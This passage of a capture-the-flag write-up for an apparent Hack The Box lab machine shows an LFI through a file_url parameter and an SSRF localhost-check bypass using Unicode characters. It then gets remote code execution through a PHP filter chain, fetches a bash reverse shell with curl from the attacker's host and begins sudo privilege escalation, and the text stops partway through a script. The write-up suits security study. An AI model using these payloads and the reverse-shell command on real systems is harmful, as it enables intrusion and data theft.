        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 04 Mar 2023 14:00:55 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">14</span>

{"data":false}
</pre></td></tr></tbody></table></code></div></div>

<p>I spent a lot of time trying to find the security issues in v2, but I did not find anything.</p>

<h3 id="lfi"><span class="mr-2">LFI</span><a href="#lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The documentation showed that the API had a â€˜file_urlâ€™ parameter that allowed loading the data to convert from a URL instead of passing it directly. I tried to point the â€˜file_urlâ€™ to my machine, the server loaded the data from my machine. I tried redirecting it to another URL, but it did not appear to follow redirects.</p>

<p>I also tried to get it to load version 2 of the API from version 3.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">'action'</span><span class="p">:</span> <span class="s">'b64encode'</span><span class="p">,</span>
  <span class="s">'file_url'</span> <span class="p">:</span> <span class="s">'http://api.haxtables.htb/v2/tools/string/index.php'</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The URL was blocked.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python test.py
<span class="o">{</span><span class="s2">"message"</span>:<span class="s2">"Unacceptable URL"</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Next, I tried to get it to load a file from the server.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">'action'</span><span class="p">:</span> <span class="s">'b64encode'</span><span class="p">,</span>
  <span class="s">'file_url'</span> <span class="p">:</span> <span class="s">'file:///etc/passwd'</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This worked.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python test.py | jq <span class="s2">".data"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</pre></td></tr></tbody></table></code></div></div>

<p>I modified the code to take the file to download as a parameter and used it to download all the source code I could find on the server.</p>

<p>The code that was vulnerable was using curl to download the file.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">get_url_content</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
  <span class="nv">$domain</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$domain</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">jsonify</span><span class="p">([</span><span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Unacceptable URL"</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span><span class="no">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
  <span class="nb">curl_setopt</span> <span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span><span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
  <span class="nv">$url_content</span> <span class="o">=</span>  <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
  <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
  <span class="k">return</span> <span class="nv">$url_content</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I could not use it to get code execution. It was also validating the domain to try to prevent Server Side Request Forgery (SSRF).</p>

<p>I also wrote a small script to look for other endpoints in v2.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">json</span>

<span class="nb">file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
    <span class="n">file_to_get</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>

    <span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'action'</span><span class="p">:</span> <span class="s">'b64encode'</span><span class="p">,</span>
        <span class="s">'file_url'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"file:///var/www/api/v2/tools/</span><span class="si">{</span><span class="n">file_to_get</span><span class="si">}</span><span class="s">/index.php"</span>
    <span class="p">}</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>

    <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

    <span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="s">'data'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">file_to_get</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It did not find anything new.</p>

<h2 id="more-lfi"><span class="mr-2">More LFI</span><a href="#more-lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I tried looking at the site on â€˜image.haxtables.htbâ€™, but I was blocked. Looking at the Apache config I got through the LFI, I saw that only localhost was allowed to access it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>&lt;VirtualHost <span class="k">*</span>:80&gt;
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
	DocumentRoot /var/www/image

        ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
        CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
	<span class="c">#SecRuleEngine On</span>

...

        &lt;Directory /var/www/image&gt;
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        &lt;/DIrectory&gt;

&lt;/VirtualHost&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>I used the LFI in the API to extract the code source for the image site. The code made it look like it was a git repository, so I extracted the .git folder also.</p>

<p>I looked at the code, and I found another LFI vulnerability.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">include_once</span> <span class="s1">'utils.php'</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
    <span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>

<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nf">jsonify</span><span class="p">([</span><span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'No page specified!'</span><span class="p">]);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This one used <code class="language-plaintext highlighter-rouge">include</code> to get the page without any validation. It would allow me to get code execution, but I was unable to access it.</p>

<p>I went back to the code that loaded a URL in the API.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">get_url_content</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
  <span class="nv">$domain</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$domain</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">jsonify</span><span class="p">([</span><span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Unacceptable URL"</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>

  <span class="mf">...</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The code was using <a href="https://www.php.net/parse_url">parse_url</a> to split the URL into parts, then <a href="https://www.php.net/gethostbyname">gethostbyname</a> to make sure the domain did not point to localhost, and finally curl to make the request.</p>

<p>I needed to find something that would not resolve to localhost in PHP, but still work in curl. I searched for vulnerabilities in all those functions. I tried multiple things like adding null bytes, and carriage returns, â€¦</p>

<p>The name of the box and its image pointed to UTF-8, so I also tried adding UTF characters at the beginning and the end, but it broke curl. I found the <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">slide to a Black Hat presentation</a> that had many things to try. And I finally got it. I needed to send a request to â€˜image.haxtabâ“›â“”s.htbâ€™. It did not resolve to localhost in PHP, but it worked in curl, and Apache sent the request to the correct vhost.</p>

<p>I modified the LFI script to exploit the second LFI.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'action'</span><span class="p">:</span> <span class="s">'b64encode'</span><span class="p">,</span>
    <span class="s">'file_url'</span> <span class="p">:</span> <span class="s">"http://image.haxtabâ“›â“”s.htb/actions/action_handler.php?page=/etc/passwd"</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="k">if</span> <span class="s">'data'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">json_data</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="s">'Failed'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">json_data</span><span class="p">)</span>
    <span class="nf">exit</span><span class="p">()</span>

<span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="s">'data'</span><span class="p">]).</span><span class="nf">decode</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>./imageLFI.py
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

...
</pre></td></tr></tbody></table></code></div></div>

<p>It worked. I then tried to get a file from my machine.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s">'file_url'</span> <span class="p">:</span> <span class="s">"http://image.haxtabâ“›â“”s.htb/actions/action_handler.php?page=http://10.10.14.8/rce.php"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This failed. <a href="https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include">allow_url_include</a> must have been disabled.</p>

<p>I spent a lot of time trying to find PHP file to include that would allow me to run arbitrary code. Or find a way to write a file on the server. I did not find any.</p>

<p>Then I remembered the <a href="https://github.com/synacktiv/php_filter_chain_generator">PHP Filter Chain technique</a>. I cloned the generator repository to my machine and tried a simple command.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php echo `id`; ?&gt;'</span>
<span class="o">[</span>+] The following gadget chain will generate the following code : &lt;?php <span class="nb">echo</span> <span class="sb">`</span><span class="nb">id</span><span class="sb">`</span><span class="p">;</span> ?&gt; <span class="o">(</span><span class="nb">base64 </span>value: PD9waHAgZWNobyBgaWRgOyA/Pg<span class="o">)</span>
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7 ... <span class="o">=</span>php://temp
</pre></td></tr></tbody></table></code></div></div>

<p>I used this filter chain as the page payload.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>../imageLFI.py                                                     
b<span class="s1">'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\x01\xb2B\x940\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4&gt;\x00=\x00=\x0f\x80\x0f@\x0f'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The result of the command was returned with some junk.</p>

<p>Next, I wrote a small script to open a reverse shell and used the filter to download it on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>shell.php       
&lt;?php
<span class="sb">`</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'</span><span class="sb">`</span><span class="p">;</span>

<span class="nv">$ </span>python php_filter_chain_generator.py  <span class="nt">--chain</span> <span class="s1">'&lt;?php `curl 10.10.14.8/shell.php -o /tmp/shell.php`; ?&gt;'</span>
<span class="o">[</span>+] The following gadget chain will generate the following code : &lt;?php <span class="sb">`</span>curl 10.10.14.8/shell.php <span class="nt">-o</span> /tmp/shell.php<span class="sb">`</span><span class="p">;</span> ?&gt; <span class="o">(</span><span class="nb">base64 </span>value: PD9waHAgYGN1cmwgMTAuMTAuMTQuOC9zaGVsbC5waHAgLW8gL3RtcC9zaGVsbC5waHBgOyA/Pg<span class="o">)</span>
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7| ...

<span class="nv">$ </span>python <span class="nt">-m</span> http.server 80                                                
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</pre></td></tr></tbody></table></code></div></div>

<p>Last, I used the second LFI to include the PHP file.</p>
<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s">'file_url'</span> <span class="p">:</span> <span class="s">"http://image.haxtabâ“›â“”s.htb/actions/action_handler.php?page=/tmp/shell.php"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I got a hit on my netcat listener.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.8] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.198] 46612
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>833<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@encoding:~/image/actions<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 12
drwxr-xr-x 2 svc svc 4096 Mar  5 18:21 <span class="nb">.</span>
drwxr-xr-x 7 svc svc 4096 Mar  5 18:21 ..
<span class="nt">-rw-r--r--</span> 1 svc svc  191 Mar  5 18:21 action_handler.php
<span class="nt">-rw-r--r--</span> 1 svc svc    0 Mar  5 18:21 image2pdf.php
www-data@encoding:~/image/actions<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
</pre></td></tr></tbody></table></code></div></div>

<h2 id="git-exploit"><span class="mr-2">Git Exploit</span><a href="#git-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once connected to the server I checked if I could run anything with sudo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>www-data@encoding:~/image/actions<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on encoding:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User www-data may run the following commands on encoding:
    <span class="o">(</span>svc<span class="o">)</span> NOPASSWD: /var/www/image/scripts/git-commit.sh
</pre></td></tr></tbody></table></code></div></div>

<p>I was able to run a script to commit changes in the image repository as the svc user.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">u</span><span class="o">=</span><span class="si">$(</span>/usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image ls-files  <span class="nt">-o</span> <span class="nt">--exclude-standard</span><span class="si">)</span>

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$u</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
